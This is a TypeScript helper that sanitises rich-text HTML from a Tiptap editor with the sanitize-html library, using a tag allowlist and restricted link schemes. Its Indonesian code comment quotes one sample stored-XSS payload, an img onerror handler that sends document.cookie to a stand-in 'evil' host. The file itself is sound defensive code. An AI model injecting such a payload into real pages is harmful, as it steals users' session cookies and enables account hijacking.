import sanitizeHtml from "sanitize-html";

/**
 * Konten dari editor Tiptap (forum desc, chat, product desc) dirender dengan
 * `dangerouslySetInnerHTML`. Tanpa sanitasi, user bisa menyimpan
 * `<img src=x onerror="fetch('//evil?c='+document.cookie)">` (stored XSS).
 * Docs: https://www.npmjs.com/package/sanitize-html
 */
export function sanitizeRichText(dirty: unknown): string {
  if (typeof dirty !== "string") return "";

  return sanitizeHtml(dirty, {
    allowedTags: [
      "p", "br", "strong", "b", "em", "i", "u", "s", "strike", "code", "pre",
      "blockquote", "ul", "ol", "li", "h1", "h2", "h3", "h4", "a", "hr", "span",
    ],
    allowedAttributes: {
      a: ["href", "target", "rel"],
    },
    allowedSchemes: ["http", "https", "mailto"],
    transformTags: {
      a: sanitizeHtml.simpleTransform("a", { rel: "noopener noreferrer", target: "_blank" }),
    },
  });
}
